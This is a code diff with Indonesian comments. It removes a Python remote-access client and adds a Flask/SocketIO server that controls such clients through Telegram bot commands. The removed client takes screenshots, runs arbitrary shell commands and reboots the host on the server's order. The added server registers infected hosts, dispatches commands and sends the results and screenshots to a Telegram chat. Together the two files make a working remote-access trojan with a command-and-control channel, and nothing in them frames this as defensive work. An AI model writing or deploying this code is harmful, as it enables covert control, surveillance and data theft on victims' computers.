@@ -1,180 +1,264 @@
-# client.py
+# server.py
 import os
-import sys
 import json
 import time
-import uuid
-import socket
-import platform
 import threading
 import requests
-import subprocess
-import pyautogui
-from PIL import Image
-import io
-from flask_socketio import SocketIO
+from flask import Flask, request, jsonify
+from flask_socketio import SocketIO, emit
+import sqlite3
+from datetime import datetime
 
-# Konfigurasi - Ganti dengan URL Render Anda
-SERVER_URL = "https://telegram-bot-server.onrender.com"  # Ganti dengan URL Render Anda
-SERVER_PORT = 443  # Port HTTPS
+app = Flask(__name__)
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
-# Generate unique client ID
-CLIENT_ID = str(uuid.uuid4())
-CLIENT_NAME = socket.gethostname()
+# Konfigurasi
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+DATABASE_URL = "clients.db"
 
-# Inisialisasi SocketIO client
-socketio = SocketIO()
+# Inisialisasi database
+def init_db():
+    conn = sqlite3.connect(DATABASE_URL)
+    cursor = conn.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS clients (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            client_id TEXT UNIQUE,
+            name TEXT,
+            last_seen TEXT,
+            status TEXT
+        )
+    ''')
+    conn.commit()
+    conn.close()
 
+# Fungsi untuk mengirim pesan ke Telegram
+def send_to_telegram(chat_id, text):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    data = {'chat_id': chat_id, 'text': text}
+    try:
+        response = requests.post(url, data=data, timeout=10)
+        return response.ok
+    except Exception as e:
+        print(f"Error sending to Telegram: {e}")
+        return False
+
+# Fungsi untuk mengirim file ke Telegram
+def send_file_to_telegram(chat_id, file_path, caption=""):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+    try:
+        with open(file_path, 'rb') as file:
+            files = {'document': file}
+            data = {'chat_id': chat_id, 'caption': caption}
+            response = requests.post(url, files=files, data=data, timeout=30)
+        return response.ok
+    except Exception as e:
+        print(f"Error sending file to Telegram: {e}")
+        return False
+
+# Endpoint untuk client mendaftar
+@app.route('/register', methods=['POST'])
 def register_client():
-    """Daftarkan client ke server"""
-    try:
-        response = requests.post(
-            f"{SERVER_URL}/register",
-            json={'client_id': CLIENT_ID, 'name': CLIENT_NAME},
-            timeout=10
-        )
-        return response.status_code == 200
-    except Exception as e:
-        print(f"Error registering client: {e}")
-        return False
+    data = request.json
+    client_id = data.get('client_id')
+    name = data.get('name')
+    
+    if not client_id or not name:
+        return jsonify({'error': 'Missing client_id or name'}), 400
+    
+    conn = sqlite3.connect(DATABASE_URL)
+    cursor = conn.cursor()
+    
+    # Perbarui atau tambahkan client
+    cursor.execute('''
+        INSERT OR REPLACE INTO clients (client_id, name, last_seen, status)
+        VALUES (?, ?, ?, ?)
+    ''', (client_id, name, datetime.now().isoformat(), 'online'))
+    
+    conn.commit()
+    conn.close()
+    
+    return jsonify({'success': True})
 
-def send_heartbeat():
-    """Kirim heartbeat ke server"""
-    try:
-        response = requests.post(
-            f"{SERVER_URL}/heartbeat",
-            json={'client_id': CLIENT_ID},
-            timeout=10
-        )
-        return response.status_code == 200
-    except Exception as e:
-        print(f"Error sending heartbeat: {e}")
-        return False
+# Endpoint untuk client update status
+@app.route('/heartbeat', methods=['POST'])
+def heartbeat():
+    data = request.json
+    client_id = data.get('client_id')
+    
+    if not client_id:
+        return jsonify({'error': 'Missing client_id'}), 400
+    
+    conn = sqlite3.connect(DATABASE_URL)
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        UPDATE clients SET last_seen = ?, status = ? WHERE client_id = ?
+    ''', (datetime.now().isoformat(), 'online', client_id))
+    
+    conn.commit()
+    conn.close()
+    
+    return jsonify({'success': True})
 
-def execute_command(command, chat_id=None):
-    """Eksekusi perintah dan kirim hasil ke server"""
-    try:
-        if command == 'screenshot':
-            # Ambil screenshot
-            screenshot = pyautogui.screenshot()
-            img_byte_arr = io.BytesIO()
-            screenshot.save(img_byte_arr, format='PNG')
-            img_byte_arr.seek(0)
-            
-            # Simpan sementara
-            filename = f"screenshot_{int(time.time())}.png"
-            with open(filename, 'wb') as f:
-                f.write(img_byte_arr.read())
-            
-            # Kirim ke server
-            socketio.emit('command_result', {
-                'client_id': CLIENT_ID,
-                'result': {
-                    'type': 'file',
-                    'file_path': filename,
-                    'caption': f"Screenshot dari {CLIENT_NAME}"
-                },
-                'chat_id': chat_id
-            })
-            
-        elif command.startswith('cmd_'):
-            # Eksekusi perintah sistem
-            cmd = command[4:]  # Hapus prefix 'cmd_'
-            
-            if platform.system() == 'Windows':
-                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-            else:
-                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-            
-            output = result.stdout + result.stderr
-            
-            # Kirim hasil ke server
-            socketio.emit('command_result', {
-                'client_id': CLIENT_ID,
-                'result': {
-                    'type': 'text',
-                    'data': f"Hasil perintah '{cmd}':\n{output}"
-                },
-                'chat_id': chat_id
-            })
-            
-        elif command == 'reboot':
-            # Reboot sistem
-            if platform.system() == 'Windows':
-                subprocess.run(["shutdown", "/r", "/t", "10"])
-            else:
-                subprocess.run(["reboot"])
-            
-            socketio.emit('command_result', {
-                'client_id': CLIENT_ID,
-                'result': {
-                    'type': 'text',
-                    'data': "Sistem akan reboot dalam 10 detik"
-                },
-                'chat_id': chat_id
-            })
-            
-        else:
-            # Perintah tidak dikenali
-            socketio.emit('command_result', {
-                'client_id': CLIENT_ID,
-                'result': {
-                    'type': 'text',
-                    'data': f"Perintah tidak dikenali: {command}"
-                },
-                'chat_id': chat_id
-            })
-            
-    except Exception as e:
-        socketio.emit('command_result', {
-            'client_id': CLIENT_ID,
-            'result': {
-                'type': 'text',
-                'data': f"Error executing command: {str(e)}"
-            },
-            'chat_id': chat_id
-        })
-
+# WebSocket untuk komunikasi real-time
 @socketio.on('connect')
 def handle_connect():
-    print("Connected to server")
-    socketio.emit('register', {
-        'client_id': CLIENT_ID,
-        'name': CLIENT_NAME
-    })
+    print('Client connected')
 
-@socketio.on('execute_command')
-def handle_execute_command(data):
-    command = data.get('command')
+@socketio.on('register')
+def handle_register(data):
+    client_id = data.get('client_id')
+    name = data.get('name')
+    
+    # Simpan ke database
+    conn = sqlite3.connect(DATABASE_URL)
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        INSERT OR REPLACE INTO clients (client_id, name, last_seen, status)
+        VALUES (?, ?, ?, ?)
+    ''', (client_id, name, datetime.now().isoformat(), 'online'))
+    
+    conn.commit()
+    conn.close()
+    
+    emit('registered', {'success': True})
+
+@socketio.on('command_result')
+def handle_command_result(data):
+    client_id = data.get('client_id')
+    result = data.get('result')
     chat_id = data.get('chat_id')
     
-    print(f"Executing command: {command}")
-    execute_command(command, chat_id)
+    # Kirim hasil ke Telegram
+    if chat_id:
+        if result.get('type') == 'text':
+            send_to_telegram(chat_id, result.get('data'))
+        elif result.get('type') == 'file':
+            send_file_to_telegram(chat_id, result.get('file_path'), result.get('caption'))
 
-def heartbeat_thread():
-    """Thread untuk mengirim heartbeat ke server"""
+# Endpoint untuk menerima webhook dari Telegram
+@app.route('/webhook', methods=['POST'])
+def telegram_webhook():
+    data = request.json
+    
+    # Proses pesan dari Telegram
+    if 'message' in data:
+        message = data['message']
+        chat_id = message['chat']['id']
+        text = message.get('text', '')
+        
+        # Parse perintah
+        if text.startswith('/'):
+            command_parts = text.split(' ', 1)
+            command = command_parts[0].lower()
+            params = command_parts[1] if len(command_parts) > 1 else ''
+            
+            # Proses perintah
+            if command == '/help':
+                help_text = (
+                    "Perintah yang tersedia:\n"
+                    "/listclients - Lihat semua client terdaftar\n"
+                    "/sendcommand_(clientid)_(command) - Kirim perintah ke client\n"
+                    "/screenshot_(clientid) - Ambil screenshot dari client\n"
+                    "/info - Informasi server"
+                )
+                send_to_telegram(chat_id, help_text)
+            
+            elif command == '/listclients':
+                conn = sqlite3.connect(DATABASE_URL)
+                cursor = conn.cursor()
+                cursor.execute('SELECT client_id, name, last_seen, status FROM clients')
+                clients = cursor.fetchall()
+                conn.close()
+                
+                if clients:
+                    response = "Daftar client:\n"
+                    for client in clients:
+                        response += f"ID: {client[0]}, Name: {client[1]}, Last Seen: {client[2]}, Status: {client[3]}\n"
+                else:
+                    response = "Tidak ada client terdaftar"
+                
+                send_to_telegram(chat_id, response)
+            
+            elif command.startswith('/sendcommand_'):
+                try:
+                    # Format: /sendcommand_clientid_command
+                    parts = command.split('_', 2)
+                    if len(parts) >= 3:
+                        client_id = parts[1]
+                        cmd = parts[2]
+                        
+                        # Kirim perintah ke client via WebSocket
+                        socketio.emit('execute_command', {
+                            'client_id': client_id,
+                            'command': cmd,
+                            'chat_id': chat_id
+                        })
+                        
+                        send_to_telegram(chat_id, f"Perintah '{cmd}' dikirim ke client {client_id}")
+                except Exception as e:
+                    send_to_telegram(chat_id, f"Error: {str(e)}")
+            
+            elif command.startswith('/screenshot_'):
+                try:
+                    client_id = command.split('_', 1)[1]
+                    
+                    # Kirim perintah screenshot ke client
+                    socketio.emit('execute_command', {
+                        'client_id': client_id,
+                        'command': 'screenshot',
+                        'chat_id': chat_id
+                    })
+                    
+                    send_to_telegram(chat_id, f"Perintah screenshot dikirim ke client {client_id}")
+                except Exception as e:
+                    send_to_telegram(chat_id, f"Error: {str(e)}")
+            
+            elif command == '/info':
+                info_text = (
+                    "Server Information:\n"
+                    f"Time: {datetime.now().isoformat()}\n"
+                    f"Connected clients: {get_client_count()}"
+                )
+                send_to_telegram(chat_id, info_text)
+    
+    return jsonify({'success': True})
+
+def get_client_count():
+    conn = sqlite3.connect(DATABASE_URL)
+    cursor = conn.cursor()
+    cursor.execute('SELECT COUNT(*) FROM clients WHERE status = "online"')
+    count = cursor.fetchone()[0]
+    conn.close()
+    return count
+
+# Thread untuk mengecek status client
+def check_client_status():
     while True:
-        send_heartbeat()
-        time.sleep(30)  # Kirim heartbeat setiap 30 detik
+        time.sleep(60)  # Cek setiap menit
+        
+        conn = sqlite3.connect(DATABASE_URL)
+        cursor = conn.cursor()
+        
+        # Update status client yang tidak terlihat dalam 5 menit
+        cursor.execute('''
+            UPDATE clients SET status = 'offline' 
+            WHERE datetime(last_seen) < datetime('now', '-5 minutes')
+        ''')
+        
+        conn.commit()
+        conn.close()
 
 if __name__ == '__main__':
-    # Daftarkan client ke server
-    if not register_client():
-        print("Failed to register client. Exiting...")
-        sys.exit(1)
+    init_db()
     
-    # Start heartbeat thread
-    hb_thread = threading.Thread(target=heartbeat_thread)
-    hb_thread.daemon = True
-    hb_thread.start()
+    # Start status checker thread
+    status_thread = threading.Thread(target=check_client_status)
+    status_thread.daemon = True
+    status_thread.start()
     
-    # Connect to server
-    socketio.connect(f"{SERVER_URL}")
-    
-    # Keep the client running
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("Client shutting down...")
-        socketio.disconnect()
+    # Jalankan server
+    port = int(os.environ.get('PORT', 10000))
+    socketio.run(app, host='0.0.0.0', port=port)
